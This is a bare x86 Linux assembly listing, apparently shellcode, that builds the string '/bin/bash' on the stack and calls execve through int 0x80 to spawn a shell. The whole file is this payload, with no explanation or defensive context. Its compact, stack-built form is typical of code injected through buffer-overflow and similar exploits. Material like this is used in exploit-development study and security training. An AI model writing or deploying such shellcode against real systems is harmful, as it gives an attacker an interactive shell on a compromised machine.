section .text
	global _start
_start:	

xor    eax,eax
push   eax
push byte 'h'	
push   '/bas'
push   '/bin'
mov    ebx,esp
mov    ecx,eax
mov    edx,eax
mov    al, 0xb
int    0x80
